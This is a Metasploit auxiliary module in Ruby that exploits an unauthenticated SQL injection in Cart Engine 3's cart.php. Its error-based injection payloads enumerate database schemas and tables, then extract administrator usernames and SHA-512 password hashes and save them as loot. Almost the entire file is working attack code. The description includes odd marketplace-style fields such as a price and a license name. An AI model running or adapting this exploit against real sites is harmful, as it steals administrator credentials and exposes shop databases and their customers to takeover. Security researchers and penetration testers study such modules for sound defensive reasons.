##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cart Engine 3 Unauthenticated SQL Injection Admin/Password Hash Retrieval',
      'Description'    => %q{
This module exploits a SQL injection in Cart Engine 3

      This module exploits an unauthenticated SQL injection in cart.php in order to enumerate admin
      usernames and their SHA-512 password hashes.

      Categories: SQL Injection

      Price: 4

      Video: none

      OS: Multi

      Arch: Multi

      Requirements: Metasploit Framework
      },
      'References'     =>
        [
          ['EDB', 'http://www.exploit-db.com/exploits/34764/']
        ],
      'Author'         =>
        [
          'bperry',
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => "Aug 25 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to CartEngine 3.0', '/']),
      ], self.class)
  end

  def build_msg(data)
    msg = Rex::MIME::Message.new
    msg.add_part("", nil, nil, 'form-data; name="AXSRF_token"')
    msg.add_part('add', nil, nil, 'form-data; name="cmd"')
    msg.add_part(data, nil, nil, 'form-data; name="item_id[0]"')
    msg.add_part('1', nil, nil, 'form-data; name="qty[0]"')

    msg
  end

  def run
    left_marker = "fdsa"
    right_marker = "fdsa"
    compare = "rewq"

    num_schemas = "1' AND (SELECT 3399 FROM(SELECT COUNT(*),"
    num_schemas << "CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST("
    num_schemas << "COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),"
    num_schemas << "0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '#{compare}'='#{compare}"

    data = build_msg(num_schemas)

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cart.php'),
      'method' => 'POST',
      'data' => data.to_s,
      'ctype' => 'multipart/form-data; boundary=' + data.bound
    })

    num_schemas = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

    schemas = []
    schemas_to_check = []
    0.upto(num_schemas-1) do |i|
      query = "1' AND (SELECT 1527 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID("
      query << "(IFNULL(CAST(schema_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.SCHEMATA "
      query << "LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '#{compare}'='#{compare}"

      msg = build_msg(query)

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'cart.php'),
        'method' => 'POST',
        'ctype' => 'multipart/form-data; boundary='+msg.bound,
        'data' => msg.to_s
      })

      schemas << $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
    end

    schemas.delete('information_schema')
    schemas.delete('mysql')

    schema_cols = {}

    schemas.each do |schema|

      schema_cols[schema] = []

      col_count = "1' AND (SELECT 3109 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
      col_count << "(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES "
      col_count << "WHERE table_schema IN (0x#{schema.unpack("H*")[0]})),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM "
      col_count << "INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '#{compare}'='#{compare}"

      msg = build_msg(col_count)

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'cart.php'),
        'method' => 'POST',
        'ctype' => 'multipart/form-data; boundary='+msg.bound,
        'data' => msg.to_s
      })

      col_count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

      0.upto(col_count-1) do |c|
        col = "1' AND (SELECT 8582 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
        col << "(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.TABLES "
        col << "WHERE table_schema IN (0x#{schema.unpack("H*")[0]}) LIMIT #{c},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x "
        col << "FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '#{compare}'='#{compare}"

        msg = build_msg(col)

        res = send_request_cgi({
          'uri' => normalize_uri(target_uri.path, 'cart.php'),
          'method' => 'POST',
          'ctype' => 'multipart/form-data; boundary=' + msg.bound,
          'data' => msg.to_s
        })

        schema_cols[schema] << $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
        schemas_to_check << schema if $1 =~ /product_opt_val/
      end
    end

    userhash = []
    schemas_to_check.each do |schema|
      schema_cols[schema][0] =~ /(.*)cache/
      prefix = $1

      query = "1' AND (SELECT 6970 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
      query << "(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{schema}.#{prefix}user WHERE admin_level=5),"
      query << "0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '#{compare}'='#{compare}"

      msg = build_msg(query)

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'cart.php'),
        'method' => 'POST',
        'ctype' => 'multipart/form-data; boundary=' + msg.bound,
        'data' => msg.to_s
      })

      admin_count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

      0.upto(admin_count-1) do |i|

        admin_id = ''
        admin_hash = ''
        ['user_id', 'user_passwd'].each do |c|
          query = "1' AND (SELECT 4315 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]}"
          query << ",(SELECT MID((IFNULL(CAST(#{c} AS CHAR),0x20)),1,50) FROM "
          query << "#{schema}.#{prefix}user WHERE admin_level=5 LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]}"
          query << ",FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '#{compare}'='#{compare}"

          msg = build_msg(query)

          res = send_request_cgi({
            'uri' => normalize_uri(target_uri.path, 'cart.php'),
            'method' => 'POST',
            'ctype' => 'multipart/form-data; boundary=' + msg.bound,
            'data' => msg.to_s
          })

          admin_id = $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/ and c == 'user_id'
          admin_hash << $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/ and c == 'user_passwd'

          k = 1
          while c == 'user_passwd' and $1.length == 50
            moar_password = "1' AND (SELECT 3966 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
            moar_password << "(SELECT MID((IFNULL(CAST(user_passwd AS CHAR),0x20)),#{50*k+1},50) FROM "
            moar_password << "#{schema}.#{prefix}user WHERE admin_level=5 LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]}"
            moar_password << ",FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '#{compare}'='#{compare}"

            msg = build_msg(moar_password)

            res = send_request_cgi({
              'uri' => normalize_uri(target_uri.path, 'cart.php'),
              'method' => 'POST',
              'ctype' => 'multipart/form-data; boundary=' + msg.bound,
              'data' => msg.to_s
            })

            admin_hash << $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
            k = k + 1
          end
        end

        userhash << admin_id + ":" + admin_hash
    end
    end

    print_status("Found the following usernames and SHA-512 hashes")
    userhash.each do |cred|
      print_good(cred)
    end

    path = store_loot('cartengine3.hashes', 'binary/octet-stream', datastore['RHOST'], userhash.join("\n"), datastore['FILEPATH'])
    print_status ("File saved to #{path}.")
  end
end

